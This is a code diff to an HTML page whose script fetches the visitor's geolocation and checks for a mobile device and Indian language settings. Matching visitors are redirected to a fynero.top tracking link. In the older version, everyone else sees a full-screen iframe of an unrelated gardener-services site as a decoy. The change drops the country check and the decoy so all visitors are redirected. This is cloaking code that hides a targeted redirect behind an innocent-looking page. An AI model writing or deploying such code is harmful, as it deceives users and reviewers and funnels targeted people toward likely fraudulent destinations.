@@ -1,4 +1,5 @@
 
+
 <!DOCTYPE html>
 <html>
 <head>
@@ -48,31 +49,20 @@
       .then(response => response.json())
       .then(data => {
         // 严格的三重条件判断
-        if (data.country === 'IN' && isMobileDevice() && isIndianLang()) {
-          window.location.href = "https://fynero.top/link/yd-sp-nf";
+        if (isMobileDevice() && isIndianLang()) {
+          window.location.href = "https://fynero.top/link/yd-csgg";
           return;
         }
-     
-        
-        var iframe = document.createElement('iframe');
-        iframe.src = 'https://housekeep.com/tradespeople/gardener/regions-all/';
-        iframe.style.width = '100%';
-        iframe.style.height = '100vh';
-        document.body.appendChild(iframe);
+      window.location.href = "https://fynero.top/link/yd-csgg";
       })
       .catch(() => {
         // IP检测失败时严格的双重条件判断
         if (isMobileDevice() && isIndianLang()) {
-          window.location.href = "https://fynero.top/link/yd-sp-nf";
+          window.location.href = "https://fynero.top/link/yd-csgg";
           return;
         }
         
-        
-        var iframe = document.createElement('iframe');
-        iframe.src = 'https://housekeep.com/tradespeople/gardener/regions-all/';
-        iframe.style.width = '100%';
-        iframe.style.height = '100vh';
-        document.body.appendChild(iframe);
+         window.location.href = "https://fynero.top/link/yd-csgg";
       });
   }
 </script>
